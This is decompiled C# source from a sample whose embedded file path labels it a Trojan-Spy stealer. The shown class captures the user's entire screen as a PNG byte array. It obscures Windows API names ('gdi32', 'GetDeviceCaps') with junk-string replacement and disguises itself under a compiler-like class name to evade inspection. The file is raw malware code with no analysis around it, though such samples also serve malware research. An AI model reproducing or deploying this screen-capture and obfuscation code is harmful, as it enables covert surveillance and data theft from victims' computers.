// Decompiled with JetBrains decompiler
// Type: PrivateImplementationDetailsStaticArrayInitTypeSizej
// Assembly: Pursuits, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5AE29391-E6B0-4A11-8563-A9AF244B152D
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-Spy.MSIL.Stealer.gen-f5d5176d0ac8a6c9093f39208d3aff397cce06017bbf0f2e4fee86a5ce09a398.exe

using Microsoft.CSharp.RuntimeBinder;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

public static class PrivateImplementationDetailsStaticArrayInitTypeSizej
{
  public static double GetWindowsScreenScalingFactor(bool percentage = true)
  {
    Graphics graphics = Graphics.FromHwnd(IntPtr.Zero);
    IntPtr hdc = graphics.GetHdc();
    PrivateImplementationDetailsStaticArrayInitTypeSizej.GetCapsDelegate getCapsDelegate = SystemNetThreadKindsG.Func<PrivateImplementationDetailsStaticArrayInitTypeSizej.GetCapsDelegate>(SystemNetThreadKindsG.GetProcAddress(SystemNetThreadKindsG.LoadLibrary("gasdl94ja;sdiasdl94ja;s32".Replace("asdl94ja;s", string.Empty)), "Gasdl94jlajsdetDevasdl94jlajsdiceCapasdl94jlajsds".Replace("asdl94jlajsd", string.Empty)));
    int num = getCapsDelegate(hdc, 10);
    double screenScalingFactor = Math.Round((double) getCapsDelegate(hdc, 117) / (double) num, 2);
    if (percentage)
      screenScalingFactor *= 100.0;
    graphics.ReleaseHdc(hdc);
    graphics.Dispose();
    return screenScalingFactor;
  }

  public static object MonitorSize()
  {
    try
    {
      double screenScalingFactor = PrivateImplementationDetailsStaticArrayInitTypeSizej.GetWindowsScreenScalingFactor(false);
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      double width = (double) bounds.Width * screenScalingFactor;
      bounds = Screen.PrimaryScreen.Bounds;
      double height = (double) bounds.Height * screenScalingFactor;
      return (object) new Size((int) width, (int) height);
    }
    catch
    {
      return (object) Screen.PrimaryScreen.Bounds.Size;
    }
  }

  public static byte[] GetImageBase()
  {
    try
    {
      object obj1 = PrivateImplementationDetailsStaticArrayInitTypeSizej.MonitorSize();
      // ISSUE: reference to a compiler-generated field
      if (PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__2 == null)
      {
        // ISSUE: reference to a compiler-generated field
        PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__2 = CallSite<Func<CallSite, System.Type, object, object, Bitmap>>.Create(Binder.InvokeConstructor(CSharpBinderFlags.None, typeof (PrivateImplementationDetailsStaticArrayInitTypeSizej), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[3]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType | CSharpArgumentInfoFlags.IsStaticType, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null),
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      Func<CallSite, System.Type, object, object, Bitmap> target = PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__2.Target;
      // ISSUE: reference to a compiler-generated field
      CallSite<Func<CallSite, System.Type, object, object, Bitmap>> p2 = PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__2;
      System.Type type = typeof (Bitmap);
      // ISSUE: reference to a compiler-generated field
      if (PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__0 == null)
      {
        // ISSUE: reference to a compiler-generated field
        PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__0 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Width", typeof (PrivateImplementationDetailsStaticArrayInitTypeSizej), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object obj2 = PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__0.Target((CallSite) PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__0, obj1);
      // ISSUE: reference to a compiler-generated field
      if (PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__1 == null)
      {
        // ISSUE: reference to a compiler-generated field
        PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__1 = CallSite<Func<CallSite, object, object>>.Create(Binder.GetMember(CSharpBinderFlags.None, "Height", typeof (PrivateImplementationDetailsStaticArrayInitTypeSizej), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[1]
        {
          CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
        }));
      }
      // ISSUE: reference to a compiler-generated field
      // ISSUE: reference to a compiler-generated field
      object obj3 = PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__1.Target((CallSite) PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__1, obj1);
      Bitmap img = target((CallSite) p2, type, obj2, obj3);
      using (Graphics graphics = Graphics.FromImage((Image) img))
      {
        graphics.InterpolationMode = InterpolationMode.Bicubic;
        graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
        graphics.SmoothingMode = SmoothingMode.HighSpeed;
        // ISSUE: reference to a compiler-generated field
        if (PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__3 == null)
        {
          // ISSUE: reference to a compiler-generated field
          PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__3 = CallSite<Action<CallSite, Graphics, Point, Point, object>>.Create(Binder.InvokeMember(CSharpBinderFlags.ResultDiscarded, "CopyFromScreen", (IEnumerable<System.Type>) null, typeof (PrivateImplementationDetailsStaticArrayInitTypeSizej), (IEnumerable<CSharpArgumentInfo>) new CSharpArgumentInfo[4]
          {
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.UseCompileTimeType, (string) null),
            CSharpArgumentInfo.Create(CSharpArgumentInfoFlags.None, (string) null)
          }));
        }
        // ISSUE: reference to a compiler-generated field
        // ISSUE: reference to a compiler-generated field
        PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__3.Target((CallSite) PrivateImplementationDetailsStaticArrayInitTypeSizej.\u003C\u003Eo__4.\u003C\u003Ep__3, graphics, new Point(0, 0), new Point(0, 0), obj1);
      }
      return PrivateImplementationDetailsStaticArrayInitTypeSizej.ConvertToBytes((Image) img);
    }
    catch (Exception ex)
    {
      return (byte[]) null;
    }
  }

  private static byte[] ConvertToBytes(Image img)
  {
    try
    {
      if (img == null)
        return (byte[]) null;
      using (MemoryStream memoryStream = new MemoryStream())
      {
        img.Save((Stream) memoryStream, ImageFormat.Png);
        return memoryStream.ToArray();
      }
    }
    catch (Exception ex)
    {
      return (byte[]) null;
    }
  }

  private delegate int GetCapsDelegate(IntPtr hDC, int nIndex);

  public enum DeviceCap
  {
    VERTRES = 10, // 0x0000000A
    DESKTOPVERTRES = 117, // 0x00000075
  }
}
